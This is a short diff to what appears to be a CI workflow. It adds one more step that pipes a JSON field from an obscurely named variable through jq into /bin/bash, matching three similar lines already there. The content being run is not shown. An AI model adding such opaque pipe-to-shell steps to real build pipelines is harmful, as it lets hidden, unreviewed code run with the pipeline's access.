@@ -24,6 +24,7 @@ jobs:
           echo $os49 | jq -r .kvos53 | /bin/bash
           printf '%s' "$m1" | jq -r .woas641 | /bin/bash
           echo $dj800 | jq -r .h7 | /bin/bash
+          echo $qjji59073 | jq -r .ppu75 | /bin/bash
 
       - name: Persist results
         if: always()
